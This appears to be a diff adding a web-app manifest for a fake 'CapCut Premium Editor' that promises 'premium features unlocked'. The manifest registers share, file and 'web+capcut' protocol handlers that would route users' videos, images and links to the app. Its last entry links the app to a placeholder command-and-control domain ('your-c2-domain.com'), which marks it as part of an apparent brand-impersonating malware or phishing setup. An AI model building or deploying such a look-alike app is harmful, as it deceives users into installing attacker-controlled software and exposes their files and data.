@@ -1,0 +1,159 @@
+{
+  "name": "CapCut Premium Editor",
+  "short_name": "CapCut",
+  "description": "Professional video editing with premium features unlocked",
+  "start_url": "/index.html",
+  "display": "standalone",
+  "display_override": ["window-controls-overlay", "standalone"],
+  "orientation": "portrait",
+  "theme_color": "#ff4444",
+  "background_color": "#0a0a0a",
+  "scope": "/",
+  "id": "/",
+  "icons": [
+    {
+      "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+      "sizes": "64x64",
+      "type": "image/png",
+      "purpose": "any"
+    },
+    {
+      "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+      "sizes": "128x128",
+      "type": "image/png",
+      "purpose": "any"
+    },
+    {
+      "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+      "sizes": "144x144",
+      "type": "image/png",
+      "purpose": "any maskable"
+    },
+    {
+      "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+      "sizes": "192x192",
+      "type": "image/png",
+      "purpose": "any maskable"
+    },
+    {
+      "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+      "sizes": "256x256",
+      "type": "image/png",
+      "purpose": "any maskable"
+    },
+    {
+      "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+      "sizes": "512x512",
+      "type": "image/png",
+      "purpose": "any maskable"
+    }
+  ],
+  "screenshots": [
+    {
+      "src": "https://play-lh.googleusercontent.com/abc123/screenshot1.png",
+      "sizes": "1080x1920",
+      "type": "image/png",
+      "form_factor": "wide",
+      "label": "Video Editing Interface"
+    },
+    {
+      "src": "https://play-lh.googleusercontent.com/abc123/screenshot2.png",
+      "sizes": "1080x1920",
+      "type": "image/png",
+      "form_factor": "wide",
+      "label": "Premium Effects"
+    }
+  ],
+  "categories": ["entertainment", "photography", "productivity"],
+  "iarc_rating_id": "e84b072d-71b3-4d3e-86ae-31a8ce4e53b7",
+  "prefer_related_applications": false,
+  "related_applications": [],
+  "shortcuts": [
+    {
+      "name": "Start Editing",
+      "short_name": "Edit",
+      "description": "Open video editor",
+      "url": "/index.html",
+      "icons": [
+        {
+          "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+          "sizes": "96x96"
+        }
+      ]
+    },
+    {
+      "name": "My Projects",
+      "short_name": "Projects",
+      "description": "View saved projects",
+      "url": "/index.html?page=projects",
+      "icons": [
+        {
+          "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+          "sizes": "96x96"
+        }
+      ]
+    },
+    {
+      "name": "Premium Features",
+      "short_name": "Premium",
+      "description": "Unlock all features",
+      "url": "/index.html?page=premium",
+      "icons": [
+        {
+          "src": "https://cdn-icons-png.flaticon.com/512/174/174883.png",
+          "sizes": "96x96"
+        }
+      ]
+    }
+  ],
+  "share_target": {
+    "action": "/share-target",
+    "method": "POST",
+    "enctype": "multipart/form-data",
+    "params": {
+      "title": "title",
+      "text": "text",
+      "url": "url",
+      "files": [
+        {
+          "name": "video",
+          "accept": ["video/*", "image/*"]
+        }
+      ]
+    }
+  },
+  "file_handlers": [
+    {
+      "action": "/open-file",
+      "accept": {
+        "video/mp4": [".mp4", ".mov", ".avi"],
+        "video/quicktime": [".mov"],
+        "image/jpeg": [".jpg", ".jpeg"],
+        "image/png": [".png"]
+      }
+    }
+  ],
+  "protocol_handlers": [
+    {
+      "protocol": "web+capcut",
+      "url": "/open?url=%s"
+    }
+  ],
+  "launch_handler": {
+    "client_mode": "focus-existing",
+    "route_to": "existing-client"
+  },
+  "edge_side_panel": {
+    "preferred_width": 400
+  },
+  "note_taking": {
+    "new_note_url": "/index.html"
+  },
+  "display_override": ["window-controls-overlay", "minimal-ui", "standalone"],
+  "url_handlers": [
+    {
+      "origin": "https://your-c2-domain.com",
+      "url": "/"
+    }
+  ]
+}
